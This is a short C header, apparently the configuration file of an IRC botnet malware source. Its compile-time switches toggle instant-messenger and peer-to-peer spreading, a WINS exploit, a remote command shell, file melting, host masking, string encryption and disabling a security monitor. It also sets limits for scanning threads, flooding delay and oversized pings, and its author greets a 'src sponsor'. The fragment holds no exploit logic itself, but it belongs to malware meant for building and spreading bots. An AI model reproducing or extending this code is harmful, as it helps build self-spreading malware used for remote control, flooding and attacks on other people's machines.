 #define NO_IDENT      // disables Ident server
 #define NO_SECSYSTEM  // disables System Secure Monitor on startup function
 #define NO_CRYPT      // disables Crypted Strings (disabled when using DUMP_ENCRYPT)
 #define DEBUG_CRYPT   // enables bot string dump in order to try to debug the Crypt() function

/*/=====================================
The Following shit is added by memcpy  |
									   |
	    Greets to my src sponsor :)	   |	
========================================
*/

// #define NO_IMSPREADER // Disables IM Spreader 
// #define NO_VIRUSREMOVE //Disables Virus Remove on start-up
// #define NO_HOSTCHANGE // Disables website host masking on start-up
// #define NO_P2P		 // Disables peer 2 peer spreading on start-up
// #define NO_IMSPREAD   // Disables IM spreading functions
// #define NO_MELT // Disables File melting on start-up
// #define NO_DCC        // disables DCC Chat/Send/Get functions
// #define NO_REMOTECMD  // disables Remote Command Shell function
// #define NO_BOTVERSION // if it works , use it , if not ... || 10th Oct. no problem , is fixed
// #define NO_WINS // Disables WINS exploit


//================================================end 
#ifdef DUMP_ENCRYPT
#define NO_CRYPT
#endif

#define IRCLINE			512
#define MAXTHREADS		512
#define MAXALIASES		16
#define LOGSIZE			128
#define LOGLINE			128
#define MAXLOGINS		2
#define MAX_LINES		500
#define MAXSCANTHRD		300
#define MAXSCANTIME		9000
#define MAXHOSTNAME		255
#define BLOCKSIZE		512
#define FLOOD_DELAY		3000
#define MAXSTRLEN		500
#define MAXNICKLEN		28
#define MAXPINGSIZE		65500
#define MAXTOKENS		32

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#define addpredefinedaliases()
